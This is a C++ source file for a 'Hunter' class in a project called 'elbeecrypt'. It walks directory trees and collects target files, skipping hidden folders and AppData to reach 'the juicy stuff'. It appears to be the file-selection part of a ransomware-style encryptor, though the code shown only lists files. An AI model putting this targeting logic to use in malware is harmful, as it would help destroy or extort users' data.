#include <iostream>
#include "elbeecrypt/common/io/direntwalk.hpp"
#include "elbeecrypt/common/io/hunter.hpp"
#include "elbeecrypt/common/utils/fs.hpp"
#include "elbeecrypt/common/utils/string.hpp"

/** Impl of hunter.hpp */
namespace elbeecrypt::common::io {
	//Include namespace definitions
	using namespace elbeecrypt::common;

	//Constructors & Destructor
	/** Impl of Hunter(vector<path>). */
	Hunter::Hunter(const std::vector<fs::path>& roots): _roots(roots){
		//Targets should be empty by default
		targets = {};
	}
	
	
	//Getters
	/** Impl of getRoots(). */
	std::vector<fs::path> Hunter::getRoots(){
		return _roots;
	}

	/** Impl of getTargets(). */
	std::vector<fs::path> Hunter::getTargets(){
		return targets;
	}

	
	//Methods
	/** Impl of toString(). */
	std::string Hunter::toString(){
		//Create the output string object
		std::string out = "Hunter{";

		//Add the relevant attributes
		out += "rootPaths=" + utils::FS::pathsVecToString(_roots) + ", ";
		out += "rootPathsCount=" + std::to_string(_roots.size()) + ", ";
		out += "targetsCount=" + std::to_string(targets.size());

		//Close off the output string and return it
		return out += "}";
	}


	//Operator overloads
	/** Impl of operator string(). */
	Hunter::operator std::string(){
		return toString();
	}


	//Private methods
	/** Impl of hunt(vector<path>). */
	void Hunter::hunt(const std::vector<fs::path>& roots){
		//Define the depth for the current directory
		uint32_t currentDepth = 0;

		//Define the lambda to collect the directory listings
		auto fileConsumer = [this, &currentDepth](const fs::path& path){
			//Add the target to the list of paths if its targetable (to be determined by subclasses)
			if(isTargetable(path, currentDepth)) targets.push_back(path);
		};

		//Loop over each root directory
		for(fs::path root : roots){
			//Get the depth of the root path
			const int rootPathDepth = common::utils::FS::pathDepth(root);

			//Define the lambda that processes each directory encountered
			auto folderConsumer = [&rootPathDepth, &currentDepth](const fs::path& path){
				//Get the delta between this path's depth and the depth of the base path and assign it to the current depth
				currentDepth = utils::FS::pathDepth(path) - rootPathDepth;

				//Skip "." directories and AppData only if the depth is 1 (skipping straight to the juicy stuff)
				if(currentDepth == 1 && path.filename().string()[0] == '.') return false;
				if(currentDepth == 1 && utils::String::toLowercase(path.filename().string()) == "appdata") return false;
				if(currentDepth == 1 && utils::String::toLowercase(path.filename().string()) == "application data") return false;

				//Return true by default, allowing the directory walker to recurse down into that directory
				return true;
			};

			//Call the walk function with the root path and the lambda
			common::io::DirentWalk::walk(root, fileConsumer, folderConsumer);
		}
	}
}
